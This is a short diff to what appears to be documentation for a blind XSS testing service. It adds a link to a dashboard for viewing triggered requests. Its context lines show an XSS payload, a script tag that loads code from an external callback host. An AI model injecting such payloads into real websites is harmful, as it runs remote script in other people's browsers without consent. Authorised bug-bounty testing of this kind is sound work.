@@ -39,3 +39,7 @@ aaa: https://request-id-domain.xss.cl
 
 content=testhello<script src="https://request-id-domain.xss.cl"></script>
 ```
+
+# Where to view the request that triggered the payload
+
+https://xss.bughunter.app/dashboard/trigger
